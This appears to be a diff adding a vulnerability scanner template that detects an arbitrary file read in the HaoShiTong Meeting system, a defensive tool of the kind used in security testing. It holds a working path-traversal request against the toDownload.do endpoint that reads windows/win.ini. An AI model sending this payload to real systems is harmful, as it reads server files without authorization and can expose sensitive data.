@@ -1,0 +1,25 @@
+id: haoshitong-file-read
+
+info:
+  name: HaoShiTong Meeting System File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There are arbitrary file reading vulnerabilities in the Haoshitong Meeting system, allowing attackers to obtain sensitive information by exploiting the `toDownload.do` endpoint.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[extensions]"
+        part: body
